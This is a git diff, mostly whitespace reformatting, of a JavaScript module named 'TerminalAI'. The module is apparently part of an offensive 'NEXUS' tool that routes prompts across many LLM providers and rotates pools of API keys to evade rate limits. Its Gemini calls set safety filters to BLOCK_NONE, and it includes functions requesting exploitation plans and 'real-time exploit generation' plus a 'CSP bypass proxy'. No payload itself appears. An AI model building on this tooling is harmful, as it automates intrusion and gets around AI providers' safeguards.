                     hf.rateLimitReset = Date.now() + 20000;
                     continue;
                 }
-                
+
                 // Model loading (503)
                 if (result?.statusCode === 503 || result?.error?.includes?.('loading')) {
                     continue; // Try next model
                 }
-                
-            } catch(e) {
+
+            } catch (e) {
                 hf.consecutiveFailures++;
                 // Silent fail - try next model
             }
         }
-        
+
         hf.consecutiveFailures++;
         return null;
     },
-    
+
     // Set backup key
     setBackupKey(provider, key) {
         if (this.backupKeys.hasOwnProperty(provider)) {
@@ -4163,11 +4163,11 @@ const TerminalAI = {
         log(`❌ Unknown provider: ${provider}`, 'red');
         return false;
     },
-    
+
     // Show configured backups
     showBackups() {
         log('🔄 CONFIGURED PROVIDERS:', 'magenta');
-        
+
         // Show free providers first
         log('   FREE PROVIDERS:', 'cyan');
         for (const [name, config] of Object.entries(this.freeProviders)) {
@@ -4175,14 +4175,14 @@ const TerminalAI = {
             const limited = Date.now() < config.rateLimitReset ? ' (rate limited)' : '';
             log(`      ${name}: ${status}${limited}`, config.enabled ? 'green' : 'yellow');
         }
-        
+
         log('   API KEY PROVIDERS:', 'cyan');
         for (const [provider, key] of Object.entries(this.backupKeys)) {
             const status = key ? '✅ Ready' : '❌ Not set';
             log(`      ${provider}: ${status}`, key ? 'green' : 'yellow');
         }
     },
-    
+
     // Check if provider is rate limited
     isProviderRateLimited(provider) {
         // Check free providers
@@ -4191,21 +4191,21 @@ const TerminalAI = {
         }
         return Date.now() < (this.providerRateLimits[provider] || 0);
     },
-    
+
     // Get next available backup (including free providers)
     getNextBackup() {
         // First try free providers
         for (const [name, config] of Object.entries(this.freeProviders)) {
-            if (config.enabled && 
-                !this.isProviderRateLimited(name) && 
+            if (config.enabled &&
+                !this.isProviderRateLimited(name) &&
                 config.failures < 5) {
                 return name;
             }
         }
-        
+
         // Then try API key providers
         for (const provider of this.fallbackOrder) {
-            if (this.backupKeys[provider] && 
+            if (this.backupKeys[provider] &&
                 !this.isProviderRateLimited(provider) &&
                 (this.providerFailures[provider] || 0) < 3) {
                 return provider;
@@ -4213,12 +4213,12 @@ const TerminalAI = {
         }
         return null;
     },
-    
+
     // Cache helpers
     getCacheKey(prompt) {
         return prompt.substring(0, 100).replace(/\\s+/g, '_');
     },
-    
+
     getFromCache(prompt) {
         const key = this.getCacheKey(prompt);
         const cached = this.responseCache.get(key);
@@ -4228,7 +4228,7 @@ const TerminalAI = {
         }
         return null;
     },
-    
+
     saveToCache(prompt, response) {
         const key = this.getCacheKey(prompt);
         this.responseCache.set(key, { response, time: Date.now() });
@@ -4237,7 +4237,7 @@ const TerminalAI = {
             this.responseCache.delete(firstKey);
         }
     },
-    
+
     // Auto-detect provider from API key prefix
     detectProvider(key) {
         if (!key) return 'gemini';
@@ -4251,7 +4251,7 @@ const TerminalAI = {
         if (key.length > 60 && /^[a-f0-9]+$/.test(key)) return 'together';
         return 'gemini';
     },
-    
+
     // Initialize AI (auto-detects provider)
     init(apiKey, forceProvider = null) {
         const detectedProvider = forceProvider || this.detectProvider(apiKey);
@@ -4259,9 +4259,9 @@ const TerminalAI = {
         this.config.provider = detectedProvider;
         this.config.isActive = true;
         this.config.rateLimitUntil = 0;
-        
+
         log(`🔍 Detected provider: ${detectedProvider.toUpperCase()} (from key prefix)`, 'cyan');
-        
+
         logBox('🤖 NEXUS AI ENGINE v5.0', [
             `Provider: ${detectedProvider.toUpperCase()} (auto-detected)`,
             `Collaboration Mode: ${this.config.collaborationMode ? 'ENABLED' : 'DISABLED'}`,
@@ -4275,10 +4275,10 @@ const TerminalAI = {
             '  • Real-time exploit generation',
             '  • Browser ↔ Terminal AI sync'
         ], 'magenta');
-        
+
         return true;
     },
-    
+
     // Safe string conversion
     safeString(value, maxLen = 200) {
         if (value === null || value === undefined) return '';
@@ -4286,32 +4286,32 @@ const TerminalAI = {
         if (typeof value === 'object') {
             try {
                 return JSON.stringify(value).substring(0, maxLen);
-            } catch(e) {
+            } catch (e) {
                 return '[Object]';
             }
         }
         return String(value).substring(0, maxLen);
     },
-    
+
     // Rate limit check
     isRateLimited() {
         return Date.now() < this.config.rateLimitUntil;
     },
-    
+
     // Wait for rate limit
     async waitForRateLimit() {
         if (this.isRateLimited()) {
             const waitTime = this.config.rateLimitUntil - Date.now();
-            log(`⏳ Rate limited. Waiting ${Math.ceil(waitTime/1000)}s...`, 'yellow');
+            log(`⏳ Rate limited. Waiting ${Math.ceil(waitTime / 1000)}s...`, 'yellow');
             await this.delay(waitTime + 1000);
         }
     },
-    
+
     // Delay helper
     delay(ms) {
         return new Promise(resolve => setTimeout(resolve, ms));
     },
-    
+
     // === GENERIC HTTP REQUEST HELPER ===
     _makeHTTPRequest(options, body = null) {
         return new Promise((resolve, reject) => {
@@ -4325,7 +4325,7 @@ const TerminalAI = {
                             const provider = this._getProviderFromHostname(options.hostname);
                             ProRateLimiter.updateFromHeaders(provider, res.headers);
                         }
-                        
+
                         // Handle rate limiting
                         if (res.statusCode === 429) {
                             const retryAfter = res.headers['retry-after'];
@@ -4333,34 +4333,34 @@ const TerminalAI = {
                             resolve({ error: 'Rate limited', rateLimited: true, retryAfter: retryMs });
                             return;
                         }
-                        
+
                         // Handle other errors
                         if (res.statusCode >= 400) {
                             resolve({ error: `HTTP ${res.statusCode}`, statusCode: res.statusCode });
                             return;
                         }
-                        
+
                         // Parse JSON response
                         const json = JSON.parse(data);
                         resolve(json);
-                    } catch(e) {
+                    } catch (e) {
                         resolve(data); // Return raw data if not JSON
                     }
                 });
             });
-            
+
             req.setTimeout(options.timeout || 30000, () => {
                 req.destroy();
                 reject(new Error('Request timeout'));
             });
-            
+
             req.on('error', (e) => reject(e));
-            
+
             if (body) req.write(body);
             req.end();
         });
     },
-    
+
     // Helper to get provider from hostname
     _getProviderFromHostname(hostname) {
         if (hostname.includes('groq')) return 'groq';
@@ -4372,13 +4372,13 @@ const TerminalAI = {
         if (hostname.includes('huggingface')) return 'huggingface';
         return 'groq';
     },
-    
+
     // === SMART REQUEST THROTTLING (Uses ProRateLimiter) ===
     async throttleRequest() {
         // Use ProRateLimiter for smart throttling
         const provider = this.config.provider || 'groq';
         await ProRateLimiter.smartWait(provider);
-        
+
         this.lastRequestTimestamp = Date.now();
     },
 
@@ -4386,7 +4386,7 @@ const TerminalAI = {
     async _legacyThrottle() {
         const now = Date.now();
         const timeSinceLastRequest = now - this.lastRequestTimestamp;
-        
+
         // Use exponential backoff if we've been rate limited recently
         if (this.backoffState.consecutiveRateLimits > 0) {
             const extraDelay = Math.min(
@@ -4395,32 +4395,32 @@ const TerminalAI = {
             );
             const waitTime = Math.max(extraDelay, this.config.minRequestInterval - timeSinceLastRequest);
             if (waitTime > 0) {
-                log(`⏳ Smart throttle: ${Math.ceil(waitTime/1000)}s delay...`, 'gray');
+                log(`⏳ Smart throttle: ${Math.ceil(waitTime / 1000)}s delay...`, 'gray');
                 await this.delay(waitTime);
             }
         } else if (timeSinceLastRequest < this.config.minRequestInterval) {
             const waitTime = this.config.minRequestInterval - timeSinceLastRequest;
             await this.delay(waitTime);
         }
-        
+
         this.lastRequestTimestamp = Date.now();
     },
-    
+
     // === SMART AUTO SWITCH TO BACKUP (Uses ProRateLimiter) ===
     async switchToBackup(reason = 'rate_limit') {
         log(`🔄 Switching provider due to: ${reason}`, 'yellow');
-        
+
         // Notify ProRateLimiter about the rate limit
         const currentProvider = this.config.provider?.toLowerCase() || 'groq';
         ProRateLimiter.onRateLimit(currentProvider);
-        
+
         // Mark current provider as limited
         const cooldown = Math.min(60000 * (this.backoffState.consecutiveRateLimits + 1), 300000); // Max 5 min
         this.providerRateLimits[this.config.provider] = Date.now() + cooldown;
-        
+
         // Increase backoff
         this.increaseBackoff();
-        
+
         // === FIRST TRY KEY POOL ROTATION ===
         if (currentProvider && this.keyPool[currentProvider]?.length > 1) {
             const nextKey = this.markKeyRateLimited(currentProvider, cooldown);
@@ -4433,11 +4433,11 @@ const TerminalAI = {
                 return true;
             }
         }
-        
+
         // === TRY OTHER PROVIDERS' KEY POOLS ===
         for (const provider of this.fallbackOrder) {
             if (provider === currentProvider || provider === 'huggingface') continue;
-            
+
             if (this.keyPool[provider]?.length > 0) {
                 const key = this.getNextKey(provider);
                 if (key) {
@@ -4450,19 +4450,19 @@ const TerminalAI = {
                 }
             }
         }
-        
+
         // === THEN TRY FREE PROVIDERS (NO API KEY NEEDED) ===
         const hfResult = await this.queryHuggingFace(this.lastPrompt || 'test');
         if (hfResult) {
             log('✅ Switched to FREE HuggingFace provider', 'green');
             return true;
         }
-        
+
         // === THEN TRY SINGLE API KEY PROVIDERS ===
         for (const provider of this.fallbackOrder) {
             // Skip huggingface as we already tried it
             if (provider === 'huggingface') continue;
-            
+
             if (this.backupKeys[provider] && !this.isProviderRateLimited(provider)) {
                 log(`✅ Switched to ${provider.toUpperCase()}`, 'green');
                 this.config.provider = provider;
@@ -4471,14 +4471,14 @@ const TerminalAI = {
                 return true;
             }
         }
-        
+
         // === APPLY EXPONENTIAL BACKOFF AND RETRY CURRENT ===
         if (this.backoffState.consecutiveRateLimits < 5) {
             await this.applyBackoff(reason);
             log('⏳ Will retry with current provider after backoff...', 'yellow');
             return 'retry';  // Signal to retry with current provider
         }
-        
+
         log('❌ No backup providers available. Tips:', 'red');
         log('   1. addkey groq YOUR_FREE_GROQ_KEY (add multiple!)', 'yellow');
         log('   2. bulkkeys groq (paste many keys at once)', 'yellow');
@@ -4486,34 +4486,34 @@ const TerminalAI = {
         log('   4. keypool - see all your keys status', 'yellow');
         return false;
     },
-    
+
     // Query AI with full error handling
     async query(prompt, context = {}, retryCount = 0) {
         if (!this.config.apiKey) {
             return { error: 'AI not configured. Use: ai-key YOUR_KEY' };
         }
-        
+
         // === SIMPLE DIRECT QUERY - NO RATE LIMITING ===
         // Use the configured provider directly
         const provider = this.config.provider?.toLowerCase() || 'groq';
-        
+
         // Build enriched prompt
         let fullPrompt = prompt;
-        
+
         // Add system prompt
         const systemPrompt = context.systemPrompt || AI_SYSTEM_PROMPTS.security_analyst;
-        
+
         // Prepend system prompt
         fullPrompt = `SYSTEM: ${systemPrompt}\n\n${fullPrompt}`;
-        
+
         // Store last prompt
         this.lastPrompt = prompt;
-        
+
         try {
             let response;
-            
+
             // Direct provider call - NO complex logic
-            switch(provider) {
+            switch (provider) {
                 case 'gemini':
                     response = await this.queryGemini(fullPrompt);
                     break;
@@ -4541,35 +4541,35 @@ const TerminalAI = {
                 default:
                     response = await this.queryGroq(fullPrompt);
             }
-            
+
             // Check if response is valid
             if (response && !response.error) {
                 // Save to history
                 this.conversationHistory.push({ role: 'user', content: this.safeString(prompt, 500) });
                 this.conversationHistory.push({ role: 'assistant', content: this.safeString(response, 1000) });
-                
+
                 // Keep history manageable
                 if (this.conversationHistory.length > 20) {
                     this.conversationHistory = this.conversationHistory.slice(-20);
                 }
-                
+
                 return response;
             }
-            
+
             // === FALLBACK TO OTHER PROVIDERS ON RATE LIMIT ===
             if (response && response.rateLimited) {
                 const fallbackProviders = ['deepseek', 'together', 'mistral', 'openrouter'];
                 const currentProvider = this.config.provider || 'groq';
-                
+
                 // Try each fallback provider
                 for (const fallback of fallbackProviders) {
                     if (fallback === currentProvider) continue;
-                    
+
                     log(`🔄 ${currentProvider.toUpperCase()} rate limited, trying ${fallback.toUpperCase()}...`, 'yellow');
-                    
+
                     try {
                         let fallbackResponse;
-                        switch(fallback) {
+                        switch (fallback) {
                             case 'deepseek':
                                 fallbackResponse = await this.queryDeepSeek(fullPrompt);
                                 break;
@@ -4583,16 +4583,16 @@ const TerminalAI = {
                                 fallbackResponse = await this.queryOpenRouter(fullPrompt);
                                 break;
                         }
-                        
+
                         if (fallbackResponse && !fallbackResponse.error) {
                             log(`✅ Got response from ${fallback.toUpperCase()} fallback`, 'green');
                             return fallbackResponse;
                         }
-                    } catch(fallbackErr) {
+                    } catch (fallbackErr) {
                         log(`⚠️ ${fallback} fallback failed: ${fallbackErr.message}`, 'dim');
                     }
                 }
-                
+
                 // === ULTIMATE FALLBACK: GUARANTEED AI SYSTEM ===
                 log('🆘 Using GuaranteedAI system (all providers failed)...', 'yellow');
                 try {
@@ -4600,19 +4600,19 @@ const TerminalAI = {
                     if (guaranteedResponse && typeof guaranteedResponse === 'string') {
                         return guaranteedResponse;
                     }
-                } catch(gErr) {
+                } catch (gErr) {
                     log(`GuaranteedAI error: ${gErr.message}`, 'dim');
                 }
-                
+
                 return { error: 'All providers exhausted. Try adding more API keys with: addkey provider YOUR_KEY', rateLimited: true };
             }
-            
+
             // Handle other errors with simple retry
             if (retryCount < 2) {
                 await this.delay(1000);
                 return this.query(prompt, context, retryCount + 1);
             }
-            
+
             // === FINAL FALLBACK: GUARANTEED AI ===
             log('🆘 Last resort: GuaranteedAI...', 'yellow');
             try {
@@ -4620,35 +4620,35 @@ const TerminalAI = {
                 if (lastResort && typeof lastResort === 'string') {
                     return lastResort;
                 }
-            } catch(e2) {
+            } catch (e2) {
                 log(`GuaranteedAI error: ${e2.message}`, 'dim');
             }
-            
+
             return response || { error: 'No response from AI' };
-            
-        } catch(e) {
+
+        } catch (e) {
             log(`AI Error: ${e.message}`, 'red');
-            
+
             // Simple retry
             if (retryCount < 2) {
                 await this.delay(1000);
                 return this.query(prompt, context, retryCount + 1);
             }
-            
+
             // === CATCH-ALL FALLBACK ===
             try {
                 const emergency = await GuaranteedAI.query(prompt, this);
                 if (emergency && typeof emergency === 'string') {
                     return emergency;
                 }
-            } catch(e3) {
+            } catch (e3) {
                 // Silent fail
             }
-            
+
             return { error: e.message };
         }
     },
-    
+
     // Gemini API with smart model fallback and rate limit handling
     async queryGemini(prompt) {
         // CORRECT WORKING MODELS in v1beta API (February 2026)
@@ -4659,7 +4659,7 @@ const TerminalAI = {
             'gemini-1.5-pro',             // MOST CAPABLE - use if others fail
             'gemini-1.0-pro'              // LEGACY fallback
         ];
-        
+
         // If we have a working model, try it first
         if (this.config.currentModel && this.modelStats[this.config.currentModel] > 0) {
             const idx = models.indexOf(this.config.currentModel);
@@ -4668,9 +4668,9 @@ const TerminalAI = {
                 models.unshift(this.config.currentModel);
             }
         }
-        
+
         let lastError = null;
-        
+
         for (const model of models) {
             try {
                 const result = await this._tryGeminiModel(prompt, model);
@@ -4681,32 +4681,32 @@ const TerminalAI = {
                     log(`✅ AI response from: ${model}`, 'green');
                     return result;
                 }
-                
+
                 if (result && result.rateLimited) {
                     log(`⚠️ Model ${model} rate limited, trying next...`, 'yellow');
                     lastError = 'Rate limited';
                     continue;
                 }
-            } catch(e) {
+            } catch (e) {
                 lastError = e.message;
                 log(`⚠️ Model ${model} failed: ${e.message}`, 'yellow');
                 continue;
             }
         }
-        
+
         // All Gemini models failed - try ALL backup providers
         log('⚠️ All Gemini models failed. Trying backup providers...', 'yellow');
         const backupResult = await this.tryAllBackups(prompt);
         if (backupResult) return backupResult;
-        
+
         return { error: lastError || 'All providers failed. Set backup: setBackup groq YOUR_KEY' };
     },
-    
+
     // === UNIVERSAL BACKUP QUERY ===
     async queryBackupProvider(prompt, provider) {
         const key = this.backupKeys[provider];
         if (!key) return null;
-        
+
         const configs = {
             groq: { hostname: 'api.groq.com', path: '/openai/v1/chat/completions', model: 'llama-3.3-70b-versatile' },
             openai: { hostname: 'api.openai.com', path: '/v1/chat/completions', model: 'gpt-4o-mini' },
@@ -4715,10 +4715,10 @@ const TerminalAI = {
             mistral: { hostname: 'api.mistral.ai', path: '/v1/chat/completions', model: 'mistral-small-latest' },
             openrouter: { hostname: 'openrouter.ai', path: '/api/v1/chat/completions', model: 'google/gemini-flash-1.5' }
         };
-        
+
         const config = configs[provider];
         if (!config) return null;
-        
+
         return new Promise((resolve) => {
             const data = JSON.stringify({
                 model: config.model,
@@ -4729,7 +4729,7 @@ const TerminalAI = {
                 max_tokens: 4096,
                 temperature: 0.7
             });
-            
+
             const options = {
                 hostname: config.hostname,
                 path: config.path,
@@ -4740,7 +4740,7 @@ const TerminalAI = {
                 },
                 timeout: 30000
             };
-            
+
             const req = https.request(options, (res) => {
                 let body = '';
                 res.on('data', chunk => body += chunk);
@@ -4761,19 +4761,19 @@ const TerminalAI = {
                             this.providerFailures[provider] = (this.providerFailures[provider] || 0) + 1;
                             resolve(null);
                         }
-                    } catch(e) {
+                    } catch (e) {
                         resolve(null);
                     }
                 });
             });
-            
+
             req.setTimeout(30000, () => { req.destroy(); resolve(null); });
             req.on('error', () => resolve(null));
             req.write(data);
             req.end();
         });
     },
-    
+
     // Try all backup providers (including FREE ones!)
     async tryAllBackups(prompt) {
         // === TRY FREE PROVIDERS FIRST ===
@@ -4783,11 +4783,11 @@ const TerminalAI = {
             log('✅ Success with FREE HuggingFace!', 'green');
             return hfResult;
         }
-        
+
         // === THEN TRY API KEY PROVIDERS ===
         for (const provider of this.fallbackOrder) {
             if (provider === 'huggingface') continue; // Already tried
-            
+
             if (this.backupKeys[provider] && !this.isProviderRateLimited(provider)) {
                 log(`🔄 Trying backup: ${provider}...`, 'yellow');
                 const result = await this.queryBackupProvider(prompt, provider);
@@ -4796,7 +4796,7 @@ const TerminalAI = {
         }
         return null;
     },
-    
+
     // Try specific Gemini model with better error handling
     _tryGeminiModel(prompt, model) {
         return new Promise((resolve, reject) => {
@@ -4813,7 +4813,7 @@ const TerminalAI = {
                     { category: 'HARM_CATEGORY_DANGEROUS_CONTENT', threshold: 'BLOCK_NONE' }
                 ]
             });
-            
+
             const options = {
                 hostname: 'generativelanguage.googleapis.com',
                 path: `/v1beta/models/${model}:generateContent?key=${this.config.apiKey}`,
@@ -4824,14 +4824,14 @@ const TerminalAI = {
                 },
                 timeout: 30000
             };
-            
+
             const req = https.request(options, (res) => {
                 let body = '';
                 res.on('data', chunk => body += chunk);
                 res.on('end', () => {
                     try {
                         const json = JSON.parse(body);
-                        
+
                         // Rate limited
                         if (res.statusCode === 429) {
                             // Extract wait time from error message
@@ -4841,13 +4841,13 @@ const TerminalAI = {
                             resolve({ rateLimited: true, waitTime });
                             return;
                         }
-                        
+
                         // Model not found
                         if (res.statusCode === 404) {
                             reject(new Error(`Model ${model} not found`));
                             return;
                         }
-                        
+
                         // Success
                         if (json.candidates && json.candidates[0]?.content?.parts?.[0]?.text) {
                             resolve(json.candidates[0].content.parts[0].text);
@@ -4858,23 +4858,23 @@ const TerminalAI = {
                         } else {
                             resolve(body);
                         }
-                    } catch(e) {
+                    } catch (e) {
                         resolve(body);
                     }
                 });
             });
-            
+
             req.setTimeout(30000, () => {
                 req.destroy();
                 reject(new Error('Request timeout'));
             });
-            
+
             req.on('error', reject);
             req.write(data);
             req.end();
         });
     },
-    
+
     // OpenAI API
     async queryOpenAI(prompt) {
         return new Promise((resolve, reject) => {
@@ -4886,7 +4886,7 @@ const TerminalAI = {
                 ],
                 max_tokens: 4096
             });
-            
+
             const options = {
                 hostname: 'api.openai.com',
                 path: '/v1/chat/completions',
@@ -4896,7 +4896,7 @@ const TerminalAI = {
                     'Authorization': `Bearer ${this.config.apiKey}`
                 }
             };
-            
+
             const req = https.request(options, (res) => {
                 let body = '';
                 res.on('data', chunk => body += chunk);
@@ -4908,18 +4908,18 @@ const TerminalAI = {
                         } else {
                             reject(new Error(json.error?.message || 'Unknown error'));
                         }
-                    } catch(e) {
+                    } catch (e) {
                         resolve(body);
                     }
                 });
             });
-            
+
             req.on('error', reject);
             req.write(data);
             req.end();
         });
     },
-    
+
     // Groq API (ultra fast, FREE - best backup)
     async queryGroq(prompt, retryCount = 0) {
         // Groq models in order of rate limit tolerance
@@ -4929,26 +4929,26 @@ const TerminalAI = {
             'mixtral-8x7b-32768',        // Good alternative
             'gemma2-9b-it'               // Fallback
         ];
-        
+
         const modelIndex = Math.min(retryCount, models.length - 1);
         const model = models[modelIndex];
-        
+
         const result = await this._queryOpenAICompatible(prompt, {
             hostname: 'api.groq.com',
             path: '/openai/v1/chat/completions',
             model: model
         });
-        
+
         // If rate limited, try next model
         if (result && result.rateLimited && retryCount < models.length - 1) {
             log(`⏳ Trying next Groq model: ${models[retryCount + 1]}...`, 'yellow');
             await this.delay(1500); // Wait 1.5s before retry
             return this.queryGroq(prompt, retryCount + 1);
         }
-        
+
         return result;
     },
-    
+
     // Together AI (good alternative)
     async queryTogether(prompt) {
         return this._queryOpenAICompatible(prompt, {
@@ -4957,7 +4957,7 @@ const TerminalAI = {
             model: 'meta-llama/Llama-3.3-70B-Instruct-Turbo'
         });
     },
-    
+
     // Mistral AI
     async queryMistral(prompt) {
         return this._queryOpenAICompatible(prompt, {
@@ -4966,7 +4966,7 @@ const TerminalAI = {
             model: 'mistral-small-latest'
         });
     },
-    
+
     // OpenRouter (multi-model gateway)
     async queryOpenRouter(prompt) {
         return this._queryOpenAICompatible(prompt, {
@@ -4975,7 +4975,7 @@ const TerminalAI = {
             model: 'google/gemini-flash-1.5'
         });
     },
-    
+
     // Generic OpenAI-compatible API handler
     _queryOpenAICompatible(prompt, opts) {
         return new Promise((resolve, reject) => {
@@ -4988,7 +4988,7 @@ const TerminalAI = {
                 max_tokens: 4096,
                 temperature: 0.7
             });
-            
+
             const options = {
                 hostname: opts.hostname,
                 path: opts.path,
@@ -4999,38 +4999,38 @@ const TerminalAI = {
                 },
                 timeout: 30000
             };
-            
+
             // Debug: Log API call
             log(`🔄 Calling ${opts.hostname} (${opts.model})...`, 'dim');
-            
+
             const req = https.request(options, (res) => {
                 let body = '';
                 res.on('data', chunk => body += chunk);
                 res.on('end', () => {
                     try {
                         const json = JSON.parse(body);
-                        
+
                         // Handle rate limit
                         if (res.statusCode === 429) {
                             log(`⏳ Rate limited by ${opts.hostname}`, 'yellow');
                             resolve({ error: 'Rate limited', rateLimited: true });
                             return;
                         }
-                        
+
                         // Handle auth errors - SWITCH PROVIDER IMMEDIATELY
                         if (res.statusCode === 401 || res.statusCode === 403) {
                             log(`❌ Auth error (${res.statusCode}): Check your API key`, 'red');
                             resolve({ error: json.error?.message || 'Invalid API Key', authError: true });
                             return;
                         }
-                        
+
                         // Handle server errors
                         if (res.statusCode >= 500) {
                             log(`❌ Server error (${res.statusCode}) from ${opts.hostname}`, 'red');
                             resolve({ error: `Server error: ${res.statusCode}` });
                             return;
                         }
-                        
+
                         // Success
                         if (json.choices && json.choices[0]?.message?.content) {
                             log(`✅ Got response from ${opts.hostname}`, 'green');
@@ -5041,18 +5041,18 @@ const TerminalAI = {
                         } else {
                             resolve(body);
                         }
-                    } catch(e) {
+                    } catch (e) {
                         log(`❌ Parse error: ${e.message}`, 'red');
                         resolve(body);
                     }
                 });
             });
-            
+
             req.setTimeout(30000, () => {
                 req.destroy();
                 reject(new Error('Request timeout'));
             });
-            
+
             req.on('error', (e) => {
                 log(`❌ Network error: ${e.message}`, 'red');
                 reject(e);
@@ -5061,77 +5061,77 @@ const TerminalAI = {
             req.end();
         });
     },
-    
+
     // ═══════════════════════════════════════════════════════════════════════════
     // API KEY VALIDATION - Used for browser CSP bypass proxy validation
     // ═══════════════════════════════════════════════════════════════════════════
-    
+
     async validateKeyDirect(apiKey, provider) {
         if (!apiKey) return false;
-        
+
         provider = provider?.toLowerCase() || 'groq';
-        
+
         const configs = {
-            groq: { 
-                hostname: 'api.groq.com', 
-                path: '/openai/v1/chat/completions', 
+            groq: {
+                hostname: 'api.groq.com',
+                path: '/openai/v1/chat/completions',
                 model: 'llama-3.3-70b-versatile',
                 authHeader: `Bearer ${apiKey}`
             },
-            openai: { 
-                hostname: 'api.openai.com', 
-                path: '/v1/chat/completions', 
+            openai: {
+                hostname: 'api.openai.com',
+                path: '/v1/chat/completions',
                 model: 'gpt-3.5-turbo',
                 authHeader: `Bearer ${apiKey}`
             },
-            deepseek: { 
-                hostname: 'api.deepseek.com', 
-                path: '/v1/chat/completions', 
+            deepseek: {
+                hostname: 'api.deepseek.com',
+                path: '/v1/chat/completions',
                 model: 'deepseek-chat',
                 authHeader: `Bearer ${apiKey}`
             },
-            gemini: { 
-                hostname: 'generativelanguage.googleapis.com', 
-                path: `/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`, 
+            gemini: {
+                hostname: 'generativelanguage.googleapis.com',
+                path: `/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`,
                 isGemini: true
             },
-            anthropic: { 
-                hostname: 'api.anthropic.com', 
-                path: '/v1/messages', 
+            anthropic: {
+                hostname: 'api.anthropic.com',
+                path: '/v1/messages',
                 model: 'claude-3-haiku-20240307',
                 authHeader: apiKey,
                 isAnthropic: true
             },
-            together: { 
-                hostname: 'api.together.xyz', 
-                path: '/v1/chat/completions', 
+            together: {
+                hostname: 'api.together.xyz',
+                path: '/v1/chat/completions',
                 model: 'meta-llama/Llama-3.3-70B-Instruct-Turbo',
                 authHeader: `Bearer ${apiKey}`
             },
-            mistral: { 
-                hostname: 'api.mistral.ai', 
-                path: '/v1/chat/completions', 
+            mistral: {
+                hostname: 'api.mistral.ai',
+                path: '/v1/chat/completions',
                 model: 'mistral-small-latest',
                 authHeader: `Bearer ${apiKey}`
             },
-            openrouter: { 
-                hostname: 'openrouter.ai', 
-                path: '/api/v1/chat/completions', 
+            openrouter: {
+                hostname: 'openrouter.ai',
+                path: '/api/v1/chat/completions',
                 model: 'google/gemini-flash-1.5',
                 authHeader: `Bearer ${apiKey}`
             }
         };
-        
+
         const config = configs[provider];
         if (!config) {
             log(`❌ Unknown provider: ${provider}`, 'red');
             return false;
         }
-        
+
         return new Promise((resolve) => {
             let data;
             let headers = { 'Content-Type': 'application/json' };
-            
+
             if (config.isGemini) {
                 data = JSON.stringify({
                     contents: [{ parts: [{ text: 'Say OK' }] }],
@@ -5153,7 +5153,7 @@ const TerminalAI = {
                 });
                 headers['Authorization'] = config.authHeader;
             }
-            
+
             const options = {
                 hostname: config.hostname,
                 path: config.path,
@@ -5161,9 +5161,9 @@ const TerminalAI = {
                 headers: headers,
                 timeout: 15000
             };
-            
+
             log(`🔑 Validating ${provider.toUpperCase()} key...`, 'cyan');
-            
+
             const req = https.request(options, (res) => {
                 let body = '';
                 res.on('data', chunk => body += chunk);
@@ -5184,36 +5184,36 @@ const TerminalAI = {
                     }
                 });
             });
-            
+
             req.setTimeout(15000, () => {
                 req.destroy();
                 log(`⏱️ ${provider.toUpperCase()} validation timeout`, 'yellow');
                 resolve(false);
             });
-            
+
             req.on('error', (e) => {
                 log(`❌ ${provider.toUpperCase()} validation error: ${e.message}`, 'red');
                 resolve(false);
             });
-            
+
             req.write(data);
             req.end();
         });
     },
-    
+
     // Query with specific key (for CSP bypass proxy)
     async queryWithKey(prompt, provider, apiKey) {
         const originalKey = this.config.apiKey;
         const originalProvider = this.config.provider;
-        
+
         try {
             // Temporarily switch to provided key/provider
             this.config.apiKey = apiKey;
             this.config.provider = provider;
-            
+
             // Call the appropriate query method
             let response;
-            switch(provider?.toLowerCase()) {
+            switch (provider?.toLowerCase()) {
                 case 'gemini':
                     response = await this.queryGemini(prompt);
                     break;
@@ -5241,7 +5241,7 @@ const TerminalAI = {
                 default:
                     response = await this.queryGroq(prompt);
             }
-            
+
             return response;
         } finally {
             // Restore original key/provider
@@ -5249,7 +5249,7 @@ const TerminalAI = {
             this.config.provider = originalProvider;
         }
     },
-    
+
     // DeepSeek API
     async queryDeepSeek(prompt) {
         return new Promise((resolve, reject) => {
@@ -5261,7 +5261,7 @@ const TerminalAI = {
                 ],
                 max_tokens: 4096
             });
-            
+
             const options = {
                 hostname: 'api.deepseek.com',
                 path: '/v1/chat/completions',
@@ -5272,7 +5272,7 @@ const TerminalAI = {
                 },
                 timeout: 30000
             };
-            
+
             const req = https.request(options, (res) => {
                 let body = '';
                 res.on('data', chunk => body += chunk);
@@ -5290,23 +5290,23 @@ const TerminalAI = {
                         } else {
                             resolve(body);
                         }
-                    } catch(e) {
+                    } catch (e) {
                         resolve(body);
                     }
                 });
             });
-            
+
             req.setTimeout(30000, () => {
                 req.destroy();
                 reject(new Error('Request timeout'));
             });
-            
+
             req.on('error', reject);
             req.write(data);
             req.end();
         });
     },
-    
+
     // Anthropic API
     async queryAnthropic(prompt) {
         return new Promise((resolve, reject) => {
@@ -5315,7 +5315,7 @@ const TerminalAI = {
                 max_tokens: 4096,
                 messages: [{ role: 'user', content: prompt }]
             });
-            
+
             const options = {
                 hostname: 'api.anthropic.com',
                 path: '/v1/messages',
@@ -5326,7 +5326,7 @@ const TerminalAI = {
                     'anthropic-version': '2023-06-01'
                 }
             };
-            
+
             const req = https.request(options, (res) => {
                 let body = '';
                 res.on('data', chunk => body += chunk);
@@ -5338,18 +5338,18 @@ const TerminalAI = {
                         } else {
                             resolve(body);
                         }
-                    } catch(e) {
+                    } catch (e) {
                         resolve(body);
                     }
                 });
             });
-            
+
             req.on('error', reject);
             req.write(data);
             req.end();
         });
     },
-    
+
     // Analyze vulnerability with AI (Enhanced v5.0)
     async analyzeVulnerability(finding, browserContext) {
         const prompt = `Analyze this security finding discovered by the BROWSER AI:
@@ -5387,7 +5387,7 @@ Respond in JSON:
 
         return await this.query(prompt, { systemPrompt: AI_SYSTEM_PROMPTS.vuln_analyzer });
     },
-    
+
     // Generate exploitation plan (Enhanced v5.0)
     async generateExploitPlan(findings, browserData) {
         const prompt = `Create a COMPREHENSIVE exploitation plan based on findings from the BROWSER AI.
@@ -5425,18 +5425,18 @@ Respond in JSON:
 
         return await this.query(prompt, { systemPrompt: AI_SYSTEM_PROMPTS.exploit_planner });
     },
-    
+
     // ═══════════════════════════════════════════════════════════════════════
     // AI COLLABORATION — Terminal AI ↔ Browser AI Communication (ENHANCED v2.0)
     // Uses TokenResearch & AIMemory for persistent learning
     // ═══════════════════════════════════════════════════════════════════════
-    
+
     // Process incoming data from browser and generate AI response
     async processCollaboration(browserFindings, browserData, ws) {
         if (!this.config.isActive || !this.config.collaborationMode) return null;
-        
+
